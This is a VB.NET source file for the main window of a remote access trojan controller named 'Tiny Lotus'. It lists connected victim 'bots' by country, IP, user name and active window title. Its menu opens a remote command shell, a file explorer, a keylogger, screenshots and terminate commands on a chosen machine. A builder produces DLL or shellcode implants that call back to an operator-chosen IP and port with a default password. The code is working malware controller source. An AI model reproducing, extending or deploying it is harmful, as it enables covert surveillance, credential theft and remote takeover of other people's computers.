Imports System.Threading
Imports System.Net
Imports System.Net.Sockets
Imports System.IO

Public Class frmmain
    Public serverTCP As TcpListener
    Public clientMgr As clsClientMgr

    Public Delegate Sub SafeLog(ByVal text As String)
    Dim version As String = "0.1"

#Region "Flag ImageList"
    Private countryCodeList As List(Of String)
    Private Sub InitImgList()
        countryCodeList = New List(Of String)
        Dim flagDic As String = Application.StartupPath + "\Flag"
        Dim di As New IO.DirectoryInfo(flagDic)
        Dim aryFi As IO.FileInfo() = di.GetFiles("*.png")
        For Each fi As IO.FileInfo In aryFi
            ImFlag.Images.Add(Image.FromFile(flagDic + "\" + fi.Name))
            countryCodeList.Add(fi.Name.Replace(".png", "").ToUpper())
        Next
    End Sub

    Private Function GetIndexByCountryCode(ByVal countryCode As String) As Integer
        Return countryCodeList.IndexOf(countryCode)
    End Function
#End Region

#Region "Block IP Address"
    Private Sub RefreshBLockIPListBox()
        lsBlockIP.Items.Clear()
        For Each ip As IPAddress In mSettings.ServerSetting.blockIPList
            lsBlockIP.Items.Add(ip.ToString())
        Next
    End Sub

    Private Sub AddBlockIPAddress(ByVal str_ip As String)
        Dim ipAddr As IPAddress = Nothing
        If IPAddress.TryParse(str_ip, ipAddr) Then
            If mSettings.ServerSetting.blockIPList.Contains(ipAddr) = False Then
                mSettings.ServerSetting.blockIPList.Add(ipAddr)
                lsBlockIP.Items.Add(ipAddr.ToString())
            End If
        End If
    End Sub

    Private Sub RemoveBlockIPAddress(ByVal str_ip As String)
        Dim ipAddr As IPAddress = IPAddress.Parse(str_ip)
        mSettings.ServerSetting.blockIPList.Remove(ipAddr)
        lsBlockIP.Items.Remove(ipAddr.ToString)
    End Sub
#End Region

#Region "Client ListView"
    Private Function Client_Listview_Init()
        With lvClient
            .View = View.Details
            .GridLines = True
            .FullRowSelect = True
            .Sorting = SortOrder.None
            .MultiSelect = False
            .HideSelection = False
            .SmallImageList = ImFlag

            'Add column header
            .Columns.Add("Flag", 45)
            .Columns.Add("Bot ID", 80)
            .Columns.Add("IP Address", 150)
            .Columns.Add("System", 200)
            .Columns.Add("User/Computer Name", 200)
            .Columns.Add("Current Window Title", 250)
        End With
        Return True
    End Function

    Private Function AddClientToListview(ByVal Client As clsClientObj)
        Dim clientInfo As structClientInfo = Client.GetClientInfo()

        'Add data to listview
        Dim data(5) As String
        data(0) = clientInfo.countryCode
        data(1) = clientInfo.botID
        data(2) = clientInfo.IP
        data(3) = clientInfo.windowVersion
        data(4) = clientInfo.computerUserName
        data(5) = clientInfo.WindowTitle
        Dim itm As ListViewItem = New ListViewItem(data)
        itm.ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)
        'lvClient.Items.Insert(lvClient.Items.Count, itm)
        lvClient.Items.Add(itm)
        Return True
    End Function

    Private Function UpdateClientToListview(ByVal Client As clsClientObj, ByVal index As Integer)
        Dim clientInfo As structClientInfo = Client.GetClientInfo()

        'Edit data from listview

        lvClient.Items.Item(index).SubItems.Item(0).Text = clientInfo.countryCode
        lvClient.Items.Item(index).SubItems.Item(1).Text = clientInfo.botID
        lvClient.Items.Item(index).SubItems.Item(2).Text = clientInfo.IP
        lvClient.Items.Item(index).SubItems.Item(3).Text = clientInfo.windowVersion
        lvClient.Items.Item(index).SubItems.Item(4).Text = clientInfo.computerUserName
        lvClient.Items.Item(index).SubItems.Item(5).Text = clientInfo.WindowTitle
        lvClient.Items.Item(index).ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)

        Return True
    End Function

    Private Sub SyncClientListView()
        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()

        If ClientList.Count > lvClient.Items.Count Then
            'Fix this...
            Dim i As Integer
            For i = lvClient.Items.Count To ClientList.Count - 1
                AddClientToListview(ClientList(i))
            Next
        ElseIf ClientList.Count < lvClient.Items.Count Then
            If ClientList.Count = 0 Then
                lvClient.Items.Clear()
            Else
                For Each item As ListViewItem In lvClient.Items
                    For Each client In ClientList
                        If client.GetClientInfo().botID <> item.SubItems(1).Text Or
                        client.GetClientInfo().computerUserName <> item.SubItems(4).Text Then
                            lvClient.Items.Remove(item)
                        End If
                    Next
                Next
            End If
        Else
            Dim i As Integer = 0
            For Each ClientObj As clsClientObj In ClientList
                UpdateClientToListview(ClientObj, i)
                i += 1
            Next
        End If
    End Sub
#End Region

    Public Sub Log(ByVal txt As String)
        If txtLog.InvokeRequired Then
            Dim d As New SafeLog(AddressOf Log)
            txtLog.Invoke(d, New Object() {txt})
        Else
            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
        End If
    End Sub

    Private Function Setting_Init() As Boolean
        If mSettings.ReadSettings() = False Then
            'If read setting fail, then default setting
            With mSettings.ServerSetting
                .Port = 6969
                .isListening = False
                .password = "lazydog"
                .blockIPList = New List(Of IPAddress)
            End With
        End If
        Return True
    End Function

    Private Function Timer_Init() As Boolean
        tmThread.Enabled = True
        tmThread.Interval = 500
        Return True
    End Function

    Public Sub AcceptClientCallBack(ByVal ar As IAsyncResult)
        Dim listener As TcpListener = ar.AsyncState

        Try
            If listener.Server IsNot Nothing Then
                If listener.Server.IsBound = True Then
                    Dim clientTCP As TcpClient = listener.EndAcceptTcpClient(ar)
                    Dim IP As IPEndPoint = clientTCP.Client.RemoteEndPoint
                    If mSettings.ServerSetting.blockIPList.Contains(IP.Address) = False Then
                        Dim clientObj As clsClientObj = New clsClientObj(clientTCP, mSettings.ServerSetting.password)

                        Log("There is a new connection from " & clientTCP.Client.RemoteEndPoint.ToString())
                        clientMgr.RegisterClient(clientObj)
                        Threading.Thread.Sleep(1)
                    Else
                        clientTCP.Client.Shutdown(SocketShutdown.Both)
                        clientTCP.Client.Disconnect(False)
                        clientTCP.Close()

                        'Log("Block IP address: " & IP.Address.ToString())
                    End If
                    serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
                End If
            End If
        Catch ex As Exception
            Log("There is an error while accept connection: " & ex.Message)
            Return
        End Try
    End Sub

    Private Function TCP_Init()
        serverTCP = New TcpListener(IPAddress.Parse("0.0.0.0"), mSettings.ServerSetting.Port)
        If mSettings.ServerSetting.isListening = True Then
            serverTCP.Start()
            serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
        End If
        Return True
    End Function

    Private Function ClientMgr_Init()
        clientMgr = New clsClientMgr()
        Return True
    End Function

    Private Function Global_Init() As Boolean
        SetAbout()
        Setting_Init()
        InitImgList()
        Client_Listview_Init()
        Timer_Init()
        TCP_Init()
        ClientMgr_Init()
        RefreshBLockIPListBox()
        Log("Program has been started!")
        Return True
    End Function

    Private Function ClientRefresh() As Boolean
        clientMgr.RefreshClient()
        Return Nothing
    End Function

    Private Sub frmmain_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Global_Init()
    End Sub

    Private Sub CrystalClearButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdExit.Click
        serverTCP.Stop()

        For Each client As clsClientObj In clientMgr.GetClientList()
            client.ForceDisconnect()
        Next

        serverTCP.Server.Dispose()

        mSettings.WriteSettings()
        End
    End Sub

    Private updateInfoCnt As Integer = 0
    Private Sub tmThread_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmThread.Tick
        'Update status
        If mSettings.ServerSetting.isListening Then
            lbStatus.Text = "Listening on port " + mSettings.ServerSetting.Port.ToString
        Else
            lbStatus.Text = "No port listening"
        End If

        'Update List of Client
        clientMgr.RefreshClient()

        'Send update info
        updateInfoCnt += 1
        If updateInfoCnt >= 10 Then
            SyncClientListView()
            UpdateClientInfo()
            updateInfoCnt = 0
        End If

    End Sub

    Private Sub UpdateClientInfo()
        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
        For Each ClientObj As clsClientObj In ClientList
            ClientObj.UpdateInfo()
        Next
    End Sub


    Private Sub cmdListen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdListen.Click
        frmListen.ShowDialog()
    End Sub

    Private Sub lvClient_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lvClient.MouseClick
        If e.Button = Windows.Forms.MouseButtons.Right Then
            If lvClient.FocusedItem.Bounds.Contains(e.Location) Then
                ctxMenu.Show(lvClient, e.Location)
            End If
        End If
    End Sub

    Private Function GetSelectedClient() As clsClientObj
        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
        For Each ClientObj As clsClientObj In ClientList
            If ClientObj.GetClientInfo.computerUserName = lvClient.FocusedItem.SubItems(4).Text _
            And ClientObj.GetClientInfo.botID = lvClient.FocusedItem.SubItems(1).Text Then
                Return ClientObj
            End If
        Next
        Return Nothing
    End Function

    Private Sub RemoteCMDToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteCMDToolStripMenuItem1.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmcmd.CmdObj = selectedClient.GetFeaObjByID(1)
        frmcmd.ShowDialog()
    End Sub

    Private Sub FileExplorerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileExplorerToolStripMenuItem1.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmFileExplorer.fileExplorerObj = selectedClient.GetFeaObjByID(3)
        frmFileExplorer.ShowDialog()
    End Sub

    Private Sub KeyloggerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeyloggerToolStripMenuItem1.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmKeylogger.KeyloggerObj = selectedClient.GetFeaObjByID(2)
        frmKeylogger.ShowDialog()
    End Sub

    Private Sub ScreenshotToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenshotToolStripMenuItem.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmScreenshot.ScreenshotObj = selectedClient.GetFeaObjByID(4)
        frmScreenshot.ShowDialog()
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If
        Dim switchObj As clsSwitch = selectedClient.GetFeaObjByID(5)
        switchObj.SendClose()
    End Sub

    Private Sub ForceCloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ForceCloseToolStripMenuItem.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If
        Dim switchObj As clsSwitch = selectedClient.GetFeaObjByID(5)
        switchObj.SendClose()
        selectedClient.ForceDisconnect()
    End Sub

    Private Sub TerminateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TerminateToolStripMenuItem.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If
        Dim switchObj As clsSwitch = selectedClient.GetFeaObjByID(5)
        switchObj.SendTerminate()
    End Sub

    Private Sub SetAbout()
        Me.Text = "Tiny Lotus " & version
        txtAbout.Text = "Tiny Lotus" & vbCrLf &
                        "Version: " & version & vbCrLf & vbCrLf &
                        "Coded by" & vbCrLf &
                        "Elvis" & vbCrLf & vbCrLf &
                        "Library" & vbCrLf &
                        "VB.NET theme by aeonhack" & vbCrLf &
                        "zlib by Jean-loup Gailly and Mark Adler" & vbCrLf &
                        "zlibnet by gdalsnes" & vbCrLf &
                        "VC-LTL by Chuyu Team" & vbCrLf &
                        "DllToShellcode by Killeven" & vbCrLf & vbCrLf &
                        "Thank to" & vbCrLf &
                        "CD Team"
    End Sub

    Private Sub cmdBuild_Click(sender As Object, e As EventArgs) Handles cmdBuild.Click
        txtBuildLog.Text = "[+] Start building..." & vbCrLf
        If txtBuildServer.Text.Length >= 50 Then
            txtBuildLog.Text += "[-] IP/DnS too long (max 49)" & vbCrLf
            Return
        ElseIf txtBuildServer.Text = "" Then
            txtBuildLog.Text += "[-] IP/DnS is empty" & vbCrLf
            Return
        Else
            txtBuildLog.Text += "[+] IP/DnS: " & txtBuildServer.Text & vbCrLf
        End If

        If txtBuildPort.Text = "" Then
            txtBuildLog.Text += "[-] Port is empty" & vbCrLf
            Return
        ElseIf Convert.ToInt32(txtBuildPort.Text) > 65535 Then
            txtBuildLog.Text += "[-] Invalid port" & vbCrLf
            Return
        Else
            txtBuildLog.Text += "[+] Port: " & txtBuildPort.Text & vbCrLf
        End If
        If txtPassword.Text.Length >= 20 Then
            txtBuildLog.Text += "[-] Password too long (max 19)" & vbCrLf
            Return
        Else
            txtBuildLog.Text += "[+] Password: " & txtPassword.Text & vbCrLf
        End If
        Dim buildObj As clsBuilder = New clsBuilder()

        Dim buildBinary As Byte() = Nothing
        If opBuildDll.Checked Then
            buildBinary = buildObj.BuildDLL(txtBuildServer.Text, Convert.ToInt32(txtBuildPort.Text), txtPassword.Text)
        ElseIf opBuildShell.Checked Then
            buildBinary = buildObj.BuildShellcode(txtBuildServer.Text, Convert.ToInt32(txtBuildPort.Text), txtPassword.Text)
        ElseIf opBuildCustom.Checked Then
            MsgBox("Not support as this time", MsgBoxStyle.Critical, "Ops")
            Return
        End If
        If buildBinary IsNot Nothing Then
            Dim saveDialog As New SaveFileDialog()
            saveDialog.Filter = "DLL files (*.dll)|*.dll|Bin files(*.bin)|*.bin|All files (*.*)|*.*"
            saveDialog.FilterIndex = 1
            saveDialog.RestoreDirectory = True
            If saveDialog.ShowDialog() = DialogResult.OK Then
                Dim fileStream As stream = saveDialog.OpenFile()
                If fileStream IsNot Nothing Then
                    fileStream.Write(buildBinary, 0, buildBinary.Length)
                    txtBuildLog.Text += "[+] Save file to " & saveDialog.FileName & vbCrLf
                    fileStream.Close()
                Else
                    txtBuildLog.Text += "[-] Failed to save file" & vbCrLf
                End If
            End If
        End If
    End Sub

    Private Sub txtBlockIPAdd_Click(sender As Object, e As EventArgs) Handles txtBlockIPAdd.Click
        AddBlockIPAddress(txtBlockIP.Text)
        txtBlockIP.Text = ""
    End Sub

    Private Sub cmdRemoveBlockIP_Click(sender As Object, e As EventArgs) Handles cmdRemoveBlockIP.Click
        If lsBlockIP.SelectedIndex <> -1 Then
            RemoveBlockIPAddress(lsBlockIP.SelectedItem)
        End If
    End Sub

End Class
